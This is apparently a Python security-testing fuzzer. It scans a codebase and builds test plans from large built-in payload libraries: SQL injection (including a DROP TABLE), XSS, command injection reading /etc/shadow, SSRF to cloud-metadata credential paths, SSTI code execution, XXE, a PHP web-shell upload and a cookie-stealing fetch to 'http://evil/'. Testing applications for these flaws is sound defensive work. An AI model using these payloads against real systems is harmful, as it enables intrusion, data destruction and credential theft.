#!/usr/bin/env python3
"""
Advanced Security Fuzzer — Generates context-aware test payloads and simulates
attack scenarios for inputs, API endpoints, file uploads, and authentication flows.

Usage:
    python fuzzer.py --target <path> [--mode auto|api|input|file|auth] [--output <file>] [--format json|markdown]
    python fuzzer.py --help

Modes:
    auto   — Detect input types and generate appropriate payloads (default)
    api    — Generate API endpoint fuzzing payloads
    input  — Generate input field fuzzing payloads
    file   — Generate file upload fuzzing payloads
    auth   — Generate authentication/authorization test cases

Examples:
    python fuzzer.py --target ./src --output /tmp/fuzz-plan.json
    python fuzzer.py --target ./api --mode api --format markdown --output /tmp/fuzz-api.md
    python fuzzer.py --target ./src --mode auth --output /tmp/fuzz-auth.json
"""

import argparse
import json
import os
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


# ─── Payload Libraries ───

SQLI_PAYLOADS = {
    "auth_bypass": [
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "' OR 1=1 LIMIT 1 --",
        "') OR ('1'='1",
        "' UNION SELECT NULL, NULL, NULL --",
        "1; DROP TABLE users --",
    ],
    "error_based": [
        "'", "''", "' AND '1'='2",
        "' AND 1=CONVERT(int, @@version) --",
        "' AND extractvalue(1, concat(0x7e, version())) --",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --",
        "' AND SLEEP(5) --",
        "' AND pg_sleep(5) --",
        "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --",
    ],
    "union_based": [
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL, NULL --",
        "' UNION SELECT NULL, NULL, NULL --",
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    ],
}

XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ],
    "attribute_escape": [
        "\" onmouseover=\"alert('XSS')\"",
        "' onfocus='alert(1)' autofocus='",
        "\" autofocus onfocus=alert(1) x=\"",
    ],
    "filter_bypass": [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    ],
    "dom_based": [
        "#<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "context_js": [
        "'; alert('XSS'); //",
        "\\'; alert(\\'XSS\\'); //",
        "</script><script>alert('XSS')</script>",
    ],
}

CMDI_PAYLOADS = {
    "basic": [
        "; ls -la", "| cat /etc/passwd", "`whoami`", "$(whoami)",
        "& ping -c 4 127.0.0.1", "|| cat /etc/shadow",
    ],
    "blind": [
        "; sleep 5", "| ping -c 5 127.0.0.1",
        "; curl http://127.0.0.1:9999/$(whoami)",
    ],
    "windows": [
        "& dir", "| type C:\\windows\\win.ini",
        "& ping -n 5 127.0.0.1", "| whoami",
    ],
    "argument": [
        "--output=/tmp/evil", "-o /tmp/evil", "--config=/dev/null",
    ],
}

SSRF_PAYLOADS = {
    "internal": [
        "http://127.0.0.1:8080/admin",
        "http://localhost:3000/internal",
        "http://[::1]:8080/",
        "http://0.0.0.0:8080/",
        "http://0x7f000001:8080/",
        "http://2130706433:8080/",
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "protocol": [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ],
}

SSTI_PAYLOADS = {
    "detection": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{7*'7'}}", "${7*'7'}", "{{config}}",
    ],
    "jinja2": [
        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        "{{ config.items() }}",
        "{{ request.environ }}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['sys'].modules['os'].popen('id').read() }}{% endif %}{% endfor %}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
}

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00.jpg",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:9999/evil.dtd">%xxe;]><root>test</root>',
]

BOUNDARY_VALUES = {
    "string": ["", " ", "a" * 10000, "\x00", "\r\n", "\n", "\t", "\u202E", "\uFEFF"],
    "number": [-1, 0, 1, -2147483648, 2147483647, 9999999999999, 0.1, float('inf'), float('nan')],
    "boolean": [True, False, "true", "false", 0, 1, "yes", "no", None],
    "array": [[], [None], [[[[]]]], list(range(10000))],
    "object": [{}, {"__proto__": {"admin": True}}, {"constructor": {"prototype": {"admin": True}}}],
}

TYPE_CONFUSION = [
    {"field": "id", "values": ["1", 1, [1], {"$gt": ""}, True, None, "1 OR 1=1"]},
    {"field": "email", "values": ["a@a.com", "", "notanemail", ["a@a.com"], None, "<script>alert(1)</script>@test.com"]},
    {"field": "name", "values": ["", "a"*10000, None, 123, [], {"$ne": ""}]},
]

AUTH_TEST_CASES = {
    "mfa_bypass": [
        {"name": "MFA code reuse", "description": "Use same OTP code twice", "steps": [
            "Login with valid credentials",
            "Submit valid MFA code → success",
            "Submit same MFA code again → should fail"
        ]},
        {"name": "MFA skip via direct navigation", "description": "Access protected endpoint without completing MFA", "steps": [
            "Login with valid credentials (get temporary token)",
            "Skip MFA verification step",
            "Try accessing protected endpoints with temporary token → should fail"
        ]},
        {"name": "MFA brute force", "description": "Brute force OTP codes", "steps": [
            "Login with valid credentials",
            "Submit wrong MFA code 10+ times → should be rate limited/locked"
        ]},
        {"name": "MFA enrollment bypass", "description": "Skip MFA setup during registration", "steps": [
            "Register new account",
            "Skip MFA enrollment step",
            "Access protected endpoints → should require MFA setup"
        ]},
    ],
    "session_attacks": [
        {"name": "Session fixation", "description": "Pre-set session ID before login", "steps": [
            "Obtain session ID from unauthenticated request",
            "Login with the same session ID",
            "Verify session ID changed after login → should be regenerated"
        ]},
        {"name": "Session persistence after password change", "description": "Old sessions still valid", "steps": [
            "Login from device A (session A)",
            "Login from device B (session B)",
            "Change password from device B",
            "Test session A → should be invalidated"
        ]},
        {"name": "Concurrent session abuse", "description": "Multiple simultaneous sessions", "steps": [
            "Login from device A",
            "Login from device B",
            "Both sessions should be tracked/limited based on policy"
        ]},
    ],
    "jwt_attacks": [
        {"name": "Algorithm none", "description": "Set JWT algorithm to 'none'", "steps": [
            "Decode valid JWT",
            "Change header to {\"alg\": \"none\", \"typ\": \"JWT\"}",
            "Remove signature",
            "Use modified token → should be rejected"
        ]},
        {"name": "Algorithm confusion (HS256/RS256)", "description": "Switch from RS256 to HS256", "steps": [
            "Obtain server's public key",
            "Create JWT signed with HS256 using public key as secret",
            "Use modified token → should be rejected"
        ]},
        {"name": "Expired token reuse", "description": "Use token past expiration", "steps": [
            "Obtain valid JWT",
            "Wait for expiration",
            "Use expired token → should be rejected"
        ]},
        {"name": "Claim manipulation", "description": "Modify JWT claims", "steps": [
            "Decode valid JWT",
            "Change role/sub/admin claims",
            "Re-sign with known weak secret",
            "Use modified token → should be rejected"
        ]},
    ],
    "privilege_escalation": [
        {"name": "IDOR - horizontal", "description": "Access other users' resources", "steps": [
            "Login as user A",
            "Get resource for user A: GET /api/users/A/data → success",
            "Try user B's resource: GET /api/users/B/data → should fail"
        ]},
        {"name": "IDOR - vertical", "description": "Access admin endpoints as regular user", "steps": [
            "Login as regular user",
            "Try admin endpoints: GET /api/admin/users → should fail",
            "Try admin actions: POST /api/admin/create-user → should fail"
        ]},
        {"name": "Mass assignment", "description": "Set role via request body", "steps": [
            "Register: POST /api/register {\"email\": \"...\", \"role\": \"admin\"}",
            "Update: PUT /api/profile {\"name\": \"...\", \"is_admin\": true}",
            "Role should NOT be settable via request body"
        ]},
        {"name": "HTTP method override", "description": "Use method override headers", "steps": [
            "POST /api/resource with X-HTTP-Method-Override: DELETE → should fail",
            "POST /api/admin/resource with X-HTTP-Method-Override: PUT → should fail"
        ]},
    ],
    "oauth2_attacks": [
        {"name": "Redirect URI manipulation", "description": "Modify redirect_uri to attacker domain", "steps": [
            "Start OAuth flow with modified redirect_uri=https://attacker.com",
            "Server should reject → redirect_uri must match registered value"
        ]},
        {"name": "PKCE downgrade", "description": "Omit PKCE from authorization code flow", "steps": [
            "Start auth flow without code_challenge",
            "Exchange code without code_verifier",
            "Server should reject → PKCE should be required"
        ]},
        {"name": "Scope escalation", "description": "Request more scopes than authorized", "steps": [
            "Request token with scope=admin:all",
            "Server should reject or downscope → only registered scopes allowed"
        ]},
    ],
}

FILE_UPLOAD_PAYLOADS = [
    {"filename": "test.php", "content": "<?php phpinfo(); ?>", "content_type": "application/x-php", "attack": "PHP execution"},
    {"filename": "test.jsp", "content": "<% out.println(System.getProperty(\"os.name\")); %>", "content_type": "application/octet-stream", "attack": "JSP execution"},
    {"filename": "test.svg", "content": "<svg onload=alert(1)>", "content_type": "image/svg+xml", "attack": "XSS via SVG"},
    {"filename": "../../../etc/cron.d/evil", "content": "* * * * * root id > /tmp/pwned", "content_type": "text/plain", "attack": "Path traversal in filename"},
    {"filename": "test.jpg.php", "content": "<?php system($_GET['c']); ?>", "content_type": "image/jpeg", "attack": "Double extension bypass"},
    {"filename": "test.php%00.jpg", "content": "<?php phpinfo(); ?>", "content_type": "image/jpeg", "attack": "Null byte extension"},
    {"filename": ".htaccess", "content": "AddType application/x-httpd-php .txt", "content_type": "text/plain", "attack": "Config override"},
    {"filename": "test.html", "content": "<script>fetch('http://evil/'+document.cookie)</script>", "content_type": "text/html", "attack": "Stored XSS via HTML upload"},
    {"filename": "polyglot.gif", "content": "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;", "content_type": "image/gif", "attack": "Polyglot GIF/JS"},
    {"filename": "a" * 500 + ".txt", "content": "test", "content_type": "text/plain", "attack": "Filename length overflow"},
]

NOSQL_INJECTION_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$gt": "", "$lt": "~"},
    {"$or": [{"admin": True}]},
]

GRAPHQL_PAYLOADS = {
    "introspection": [
        '{"query": "{ __schema { types { name fields { name type { name } } } } }"}',
        '{"query": "{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
    ],
    "dos_nested": [
        '{"query": "{ users { friends { friends { friends { friends { name } } } } } }"}',
    ],
    "alias_batching": [
        '{"query": "{ a1: login(u:\\"admin\\",p:\\"pass1\\"){t} a2: login(u:\\"admin\\",p:\\"pass2\\"){t} a3: login(u:\\"admin\\",p:\\"pass3\\"){t} }"}',
    ],
    "field_suggestion": [
        '{"query": "{ user { passwor } }"}',
        '{"query": "{ user { secre } }"}',
        '{"query": "{ user { toke } }"}',
    ],
    "injection": [
        '{"query": "mutation { createUser(name: \\"test\' OR 1=1--\\") { id } }"}',
        '{"query": "mutation { createUser(name: \\"<script>alert(1)</script>\\") { id } }"}',
    ],
}


# ─── Endpoint & Input Discovery ───

def find_endpoints(target: str) -> list:
    """Discover API endpoints from source code."""
    endpoints = []
    patterns = [
        (r"""@(?:app|router)\.(get|post|put|patch|delete)\s*\(\s*[\"'](.*?)[\"']""", "python_flask"),
        (r"""router\.(get|post|put|patch|delete)\s*\(\s*[\"'](.*?)[\"']""", "node_express"),
        (r"""@(GetMapping|PostMapping|PutMapping|PatchMapping|DeleteMapping)\s*\(\s*[\"'](.*?)[\"']\s*\)""", "java_spring"),
        (r"""Route::(get|post|put|patch|delete)\s*\(\s*[\"'](.*?)[\"']""", "php_laravel"),
        (r"""path\s*\(\s*[\"'](.*?)[\"']""", "django_urls"),
    ]

    target_path = Path(target)
    if target_path.is_file():
        files = [target_path]
    else:
        skip_dirs = {"node_modules", ".git", "__pycache__", ".venv", "venv", "vendor", "dist", "build"}
        files = []
        for root, dirs, filenames in os.walk(target_path):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for f in filenames:
                if f.endswith((".py", ".js", ".ts", ".java", ".php", ".rb", ".go")):
                    files.append(Path(root) / f)

    for filepath in files:
        try:
            content = filepath.read_text(encoding="utf-8", errors="ignore")
            for pattern, framework in patterns:
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    groups = match.groups()
                    if len(groups) >= 2:
                        method = groups[0].upper()
                        path = groups[1]
                        if method in ("GETMAPPING", "POSTMAPPING", "PUTMAPPING", "PATCHMAPPING", "DELETEMAPPING"):
                            method = method.replace("MAPPING", "")
                    else:
                        method = "GET"
                        path = groups[0]

                    endpoints.append({
                        "method": method,
                        "path": path,
                        "file": str(filepath),
                        "framework": framework,
                    })
        except IOError:
            continue

    return endpoints


def find_input_fields(target: str) -> list:
    """Discover user input consumption points."""
    inputs = []
    patterns = [
        (r"""request\.(body|params|query|headers|cookies|form|files|args|data)\b\.?(\w*)""", "python/node"),
        (r"""\$_(GET|POST|REQUEST|COOKIE|FILES)\s*\[\s*[\"'](.*?)[\"']\s*\]""", "php"),
        (r"""getParameter\s*\(\s*[\"'](.*?)[\"']\s*\)""", "java"),
        (r"""@RequestParam\s*(?:\(.*?[\"'](.*?)[\"'].*?\))?\s+\w+\s+(\w+)""", "java_spring"),
        (r"""params\[:(.*?)\]|params\.permit\((.*?)\)""", "ruby_rails"),
    ]

    target_path = Path(target)
    if target_path.is_file():
        files = [target_path]
    else:
        skip_dirs = {"node_modules", ".git", "__pycache__", ".venv", "venv", "vendor", "dist", "build"}
        files = []
        for root, dirs, filenames in os.walk(target_path):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for f in filenames:
                if f.endswith((".py", ".js", ".ts", ".java", ".php", ".rb", ".go")):
                    files.append(Path(root) / f)

    for filepath in files:
        try:
            content = filepath.read_text(encoding="utf-8", errors="ignore")
            for line_num, line in enumerate(content.split("\n"), 1):
                for pattern, lang in patterns:
                    for match in re.finditer(pattern, line):
                        groups = [g for g in match.groups() if g]
                        field_name = groups[-1] if groups else "unknown"
                        source = groups[0] if groups else "unknown"
                        inputs.append({
                            "field": field_name,
                            "source": source,
                            "file": str(filepath),
                            "line": line_num,
                            "language": lang,
                        })
        except IOError:
            continue

    return inputs


def find_file_uploads(target: str) -> list:
    """Discover file upload endpoints."""
    uploads = []
    patterns = [
        r"""(?:multer|upload|file|multipart|formidable)""",
        r"""request\.files""",
        r"""\$_FILES""",
        r"""@RequestParam.*MultipartFile""",
        r"""enctype\s*=\s*[\"']multipart/form-data""",
    ]

    target_path = Path(target)
    skip_dirs = {"node_modules", ".git", "__pycache__", ".venv", "venv", "vendor", "dist", "build"}

    for root, dirs, filenames in os.walk(target_path):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for f in filenames:
            if f.endswith((".py", ".js", ".ts", ".java", ".php", ".rb", ".go", ".html")):
                filepath = os.path.join(root, f)
                try:
                    content = open(filepath, "r", encoding="utf-8", errors="ignore").read()
                    for pattern in patterns:
                        for match in re.finditer(pattern, content, re.IGNORECASE):
                            line_num = content[:match.start()].count("\n") + 1
                            uploads.append({
                                "file": filepath,
                                "line": line_num,
                                "pattern": match.group(),
                            })
                except IOError:
                    continue

    return uploads


# ─── Fuzz Plan Generation ───

def generate_api_fuzz_plan(endpoints: list) -> list:
    """Generate comprehensive fuzz plan for API endpoints."""
    plan = []

    for ep in endpoints:
        test_case = {
            "endpoint": ep["path"],
            "method": ep["method"],
            "file": ep["file"],
            "tests": [],
        }

        # Extract path parameters
        path_params = re.findall(r"""[{<:]\s*(\w+)\s*[}>]""", ep["path"])

        # SQL injection on path params
        if path_params:
            for param in path_params:
                test_case["tests"].append({
                    "category": "SQL Injection",
                    "target": f"path_param:{param}",
                    "payloads": SQLI_PAYLOADS["auth_bypass"][:3] + SQLI_PAYLOADS["time_based"][:2],
                })

        # Method-specific tests
        if ep["method"] in ("POST", "PUT", "PATCH"):
            test_case["tests"].extend([
                {"category": "SQL Injection (body)", "target": "request_body", "payloads": SQLI_PAYLOADS["auth_bypass"]},
                {"category": "XSS (body)", "target": "request_body", "payloads": XSS_PAYLOADS["basic"] + XSS_PAYLOADS["filter_bypass"][:3]},
                {"category": "NoSQL Injection", "target": "request_body", "payloads": [json.dumps(p) for p in NOSQL_INJECTION_PAYLOADS]},
                {"category": "Mass Assignment", "target": "request_body", "payloads": [
                    '{"role": "admin"}', '{"is_admin": true}', '{"__proto__": {"admin": true}}',
                ]},
                {"category": "Boundary Values", "target": "request_body", "payloads": [
                    '{"field": ""}', '{"field": null}', '{"field": -1}',
                    '{"field": 999999999}', '{"field": "' + 'A' * 10000 + '"}',
                ]},
            ])

        # Auth tests on all endpoints
        test_case["tests"].append({
            "category": "Authentication",
            "target": "headers",
            "payloads": [
                "No Authorization header",
                "Authorization: Bearer expired_token",
                "Authorization: Bearer invalid_token",
                "Authorization: Bearer (empty)",
            ],
        })

        # SSRF on URL parameters
        if any(kw in ep["path"].lower() for kw in ["url", "link", "redirect", "callback", "webhook", "fetch", "proxy"]):
            test_case["tests"].append({
                "category": "SSRF",
                "target": "url_parameter",
                "payloads": SSRF_PAYLOADS["internal"] + SSRF_PAYLOADS["cloud_metadata"],
            })

        # Path traversal on file-related endpoints
        if any(kw in ep["path"].lower() for kw in ["file", "download", "upload", "export", "import", "path", "doc"]):
            test_case["tests"].append({
                "category": "Path Traversal",
                "target": "file_parameter",
                "payloads": PATH_TRAVERSAL_PAYLOADS,
            })

        # Admin endpoint access control
        if any(kw in ep["path"].lower() for kw in ["admin", "manage", "dashboard", "internal", "config", "settings"]):
            test_case["tests"].append({
                "category": "Vertical Privilege Escalation",
                "target": "authorization",
                "payloads": [
                    "Access as unauthenticated user → should return 401",
                    "Access as regular user → should return 403",
                    "Access as user from different tenant → should return 403",
                ],
            })

        plan.append(test_case)

    return plan


def generate_input_fuzz_plan(inputs: list) -> list:
    """Generate fuzz plan for input fields."""
    plan = []
    seen = set()

    for inp in inputs:
        key = f"{inp['field']}:{inp['source']}"
        if key in seen:
            continue
        seen.add(key)

        test_case = {
            "field": inp["field"],
            "source": inp["source"],
            "file": inp["file"],
            "line": inp["line"],
            "tests": [],
        }

        field_lower = inp["field"].lower()

        # Inject appropriate payloads based on field name
        if any(kw in field_lower for kw in ["id", "user_id", "uid", "pid", "order_id"]):
            test_case["tests"].extend([
                {"category": "SQL Injection", "payloads": SQLI_PAYLOADS["auth_bypass"][:3]},
                {"category": "IDOR", "payloads": ["0", "-1", "999999", "other_user_id"]},
                {"category": "Type Confusion", "payloads": ["abc", "[]", "{}", "null", "true"]},
            ])
        elif any(kw in field_lower for kw in ["name", "title", "description", "comment", "message", "text", "body"]):
            test_case["tests"].extend([
                {"category": "XSS", "payloads": XSS_PAYLOADS["basic"] + XSS_PAYLOADS["filter_bypass"][:3]},
                {"category": "SQL Injection", "payloads": SQLI_PAYLOADS["auth_bypass"][:3]},
                {"category": "SSTI", "payloads": SSTI_PAYLOADS["detection"]},
                {"category": "Boundary", "payloads": BOUNDARY_VALUES["string"][:5]},
            ])
        elif any(kw in field_lower for kw in ["email", "mail"]):
            test_case["tests"].extend([
                {"category": "XSS via Email", "payloads": ["<script>alert(1)</script>@test.com", "user@test.com\nBCC:attacker@evil.com"]},
                {"category": "Boundary", "payloads": ["", "notanemail", "a" * 1000 + "@test.com"]},
            ])
        elif any(kw in field_lower for kw in ["url", "link", "href", "redirect", "callback", "webhook"]):
            test_case["tests"].extend([
                {"category": "SSRF", "payloads": SSRF_PAYLOADS["internal"] + SSRF_PAYLOADS["cloud_metadata"]},
                {"category": "Open Redirect", "payloads": ["//evil.com", "https://evil.com", "javascript:alert(1)"]},
            ])
        elif any(kw in field_lower for kw in ["file", "path", "filename", "filepath", "dir"]):
            test_case["tests"].extend([
                {"category": "Path Traversal", "payloads": PATH_TRAVERSAL_PAYLOADS},
                {"category": "Command Injection", "payloads": CMDI_PAYLOADS["basic"][:3]},
            ])
        elif any(kw in field_lower for kw in ["password", "passwd", "pwd", "pass", "secret"]):
            test_case["tests"].extend([
                {"category": "SQL Injection", "payloads": SQLI_PAYLOADS["auth_bypass"]},
                {"category": "Boundary", "payloads": ["", " ", "a" * 10000, "\x00"]},
            ])
        elif any(kw in field_lower for kw in ["xml", "data", "payload", "content"]):
            test_case["tests"].extend([
                {"category": "XXE", "payloads": XXE_PAYLOADS},
                {"category": "XSS", "payloads": XSS_PAYLOADS["basic"][:3]},
            ])
        elif any(kw in field_lower for kw in ["cmd", "command", "exec", "run", "query", "search"]):
            test_case["tests"].extend([
                {"category": "Command Injection", "payloads": CMDI_PAYLOADS["basic"]},
                {"category": "SQL Injection", "payloads": SQLI_PAYLOADS["auth_bypass"][:3]},
            ])
        else:
            # Generic fuzzing for unknown fields
            test_case["tests"].extend([
                {"category": "XSS", "payloads": XSS_PAYLOADS["basic"][:2]},
                {"category": "SQL Injection", "payloads": SQLI_PAYLOADS["error_based"][:2]},
                {"category": "Boundary", "payloads": ["", None, -1, "a" * 10000]},
            ])

        plan.append(test_case)

    return plan


def generate_auth_fuzz_plan(target: str) -> list:
    """Generate authentication/authorization test plan."""
    plan = []

    # Detect auth-related code
    auth_files = []
    target_path = Path(target)
    skip_dirs = {"node_modules", ".git", "__pycache__", ".venv", "venv", "vendor"}

    for root, dirs, filenames in os.walk(target_path):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for f in filenames:
            if f.endswith((".py", ".js", ".ts", ".java", ".php", ".rb", ".go")):
                filepath = os.path.join(root, f)
                try:
                    content = open(filepath, "r", encoding="utf-8", errors="ignore").read()
                    if re.search(r"(login|authenticate|auth|session|jwt|oauth|mfa|totp|password|token)", content, re.IGNORECASE):
                        auth_files.append(filepath)
                except IOError:
                    continue

    # Detect what auth mechanisms are present
    has_jwt = False
    has_mfa = False
    has_oauth = False
    has_session = False

    for filepath in auth_files:
        try:
            content = open(filepath, "r", encoding="utf-8", errors="ignore").read()
            if re.search(r"(jwt|jsonwebtoken|jose|pyjwt)", content, re.IGNORECASE):
                has_jwt = True
            if re.search(r"(mfa|totp|otp|two.?factor|2fa|pyotp|speakeasy)", content, re.IGNORECASE):
                has_mfa = True
            if re.search(r"(oauth|passport|openid|oidc)", content, re.IGNORECASE):
                has_oauth = True
            if re.search(r"(session|cookie|express-session|flask.session)", content, re.IGNORECASE):
                has_session = True
        except IOError:
            continue

    # Always include basic auth tests
    plan.append({
        "category": "Privilege Escalation",
        "auth_files": auth_files[:5],
        "tests": AUTH_TEST_CASES["privilege_escalation"],
    })

    if has_jwt:
        plan.append({
            "category": "JWT Security",
            "auth_files": auth_files[:5],
            "tests": AUTH_TEST_CASES["jwt_attacks"],
        })

    if has_mfa:
        plan.append({
            "category": "MFA Bypass",
            "auth_files": auth_files[:5],
            "tests": AUTH_TEST_CASES["mfa_bypass"],
        })

    if has_oauth:
        plan.append({
            "category": "OAuth2 Security",
            "auth_files": auth_files[:5],
            "tests": AUTH_TEST_CASES["oauth2_attacks"],
        })

    if has_session:
        plan.append({
            "category": "Session Security",
            "auth_files": auth_files[:5],
            "tests": AUTH_TEST_CASES["session_attacks"],
        })

    return plan


# ─── Output Formatting ───

def format_markdown(plan: dict, target: str) -> str:
    lines = [
        "# Security Fuzzing Plan",
        f"**Target:** `{target}`",
        f"**Date:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**Mode:** {plan.get('mode', 'auto')}",
        "",
    ]

    # Summary
    total_tests = 0
    for section in plan.get("sections", []):
        for item in section.get("items", []):
            total_tests += len(item.get("tests", []))

    lines.extend([
        "## Summary",
        f"- **Total test categories:** {sum(len(s.get('items', [])) for s in plan.get('sections', []))}",
        f"- **Total test groups:** {total_tests}",
        "",
    ])

    for section in plan.get("sections", []):
        lines.append(f"## {section['name']}")
        lines.append("")

        for item in section.get("items", []):
            # API endpoint or input field
            if "endpoint" in item:
                lines.append(f"### {item['method']} {item['endpoint']}")
                lines.append(f"*File:* `{item.get('file', 'N/A')}`")
            elif "field" in item:
                lines.append(f"### Input: `{item['field']}` (source: {item.get('source', 'N/A')})")
                lines.append(f"*File:* `{item.get('file', 'N/A')}:{item.get('line', '')}`")
            elif "category" in item:
                lines.append(f"### {item['category']}")
                if "auth_files" in item:
                    lines.append(f"*Related files:* {', '.join(f'`{f}`' for f in item['auth_files'][:3])}")
            lines.append("")

            for test in item.get("tests", []):
                if isinstance(test, dict) and "category" in test and "payloads" in test:
                    lines.append(f"**{test['category']}** ({len(test['payloads'])} payloads)")
                    for p in test["payloads"][:5]:
                        p_str = str(p)[:80]
                        lines.append(f"  - `{p_str}`")
                    if len(test["payloads"]) > 5:
                        lines.append(f"  - *... and {len(test['payloads']) - 5} more*")
                elif isinstance(test, dict) and "name" in test:
                    lines.append(f"**{test['name']}** — {test.get('description', '')}")
                    for step in test.get("steps", []):
                        lines.append(f"  1. {step}")
                lines.append("")

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Security Fuzzer — generate context-aware attack payloads and test plans",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  auto   Detect input types and generate appropriate payloads (default)
  api    Generate API endpoint fuzzing payloads
  input  Generate input field fuzzing payloads
  file   Generate file upload fuzzing payloads
  auth   Generate authentication/authorization test cases

Examples:
  %(prog)s --target ./src --output /tmp/fuzz-plan.json
  %(prog)s --target ./api --mode api --format markdown
  %(prog)s --target ./src --mode auth --output /tmp/fuzz-auth.json
        """
    )
    parser.add_argument("--target", required=True, help="Source code directory to analyze")
    parser.add_argument("--mode", choices=["auto", "api", "input", "file", "auth"], default="auto", help="Fuzzing mode")
    parser.add_argument("--output", help="Output file path (stdout if not specified)")
    parser.add_argument("--format", choices=["json", "markdown"], default="json", help="Output format")

    args = parser.parse_args()

    if not os.path.exists(args.target):
        print(f"Error: Target '{args.target}' does not exist", file=sys.stderr)
        sys.exit(1)

    plan = {"mode": args.mode, "target": args.target, "timestamp": datetime.now(timezone.utc).isoformat(), "sections": []}

    if args.mode in ("auto", "api"):
        endpoints = find_endpoints(args.target)
        if endpoints:
            api_plan = generate_api_fuzz_plan(endpoints)
            plan["sections"].append({"name": "API Endpoint Fuzzing", "items": api_plan})
            print(f"Found {len(endpoints)} endpoints → {len(api_plan)} test groups", file=sys.stderr)

    if args.mode in ("auto", "input"):
        inputs = find_input_fields(args.target)
        if inputs:
            input_plan = generate_input_fuzz_plan(inputs)
            plan["sections"].append({"name": "Input Field Fuzzing", "items": input_plan})
            print(f"Found {len(inputs)} input points → {len(input_plan)} test groups", file=sys.stderr)

    if args.mode in ("auto", "file"):
        uploads = find_file_uploads(args.target)
        if uploads:
            plan["sections"].append({"name": "File Upload Fuzzing", "items": [
                {"category": "File Upload Attacks", "tests": FILE_UPLOAD_PAYLOADS, "upload_points": uploads}
            ]})
            print(f"Found {len(uploads)} file upload points", file=sys.stderr)

    if args.mode in ("auto", "auth"):
        auth_plan = generate_auth_fuzz_plan(args.target)
        if auth_plan:
            plan["sections"].append({"name": "Authentication & Authorization", "items": auth_plan})
            print(f"Generated {len(auth_plan)} auth test categories", file=sys.stderr)

    if args.format == "markdown":
        output = format_markdown(plan, args.target)
    else:
        output = json.dumps(plan, indent=2, default=str)

    if args.output:
        os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"Fuzz plan written to {args.output}", file=sys.stderr)
    else:
        sys.stdout.buffer.write(output.encode("utf-8", errors="replace"))
        sys.stdout.buffer.write(b"\n")


if __name__ == "__main__":
    main()
